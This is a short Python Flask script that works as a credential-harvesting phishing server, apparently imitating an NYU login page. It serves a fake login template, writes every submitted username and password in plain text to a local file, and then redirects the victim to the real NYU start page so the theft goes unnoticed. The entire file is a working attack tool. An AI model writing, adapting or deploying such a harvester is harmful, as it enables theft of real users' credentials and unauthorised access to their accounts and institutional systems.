#!/usr/bin/env python3
from flask import Flask, render_template, request, redirect
from threading import Lock

app = Flask(__name__)

lock = Lock()
# Serve the static HTML file
@app.route('/')
def serve_html():
    return render_template('pyrite_login.html')

# Handle POST requests at the /login route
@app.route('/', methods=['POST'])
def login():
    # Process the login data here
    # You can access form data using `request.form`
    # For example:
    with lock:
        username = request.form['j_username']
        password = request.form['j_password']
        with open("username_and_passwords.txt", "a") as txtFile:
            txtFile.write(username + " " +  password + "\n")

    # Perform authentication logic or any other processing

    # Return a response (you can customize this)
    return redirect("https://start.nyu.edu", code=302)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=80)
